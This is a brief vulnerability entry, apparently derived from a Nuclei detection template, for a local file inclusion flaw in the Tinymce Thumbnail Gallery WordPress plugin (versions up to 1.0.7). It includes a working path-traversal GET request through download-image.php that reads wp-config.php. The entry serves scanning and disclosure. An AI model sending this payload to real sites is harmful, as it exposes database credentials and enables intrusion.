# Vulnerability: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`wp-tinymce-lfi.yaml`)

## Description
Tinymce Thumbnail Gallery 1.0.7 and before are vulnerable to local file inclusion via download-image.php.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
```

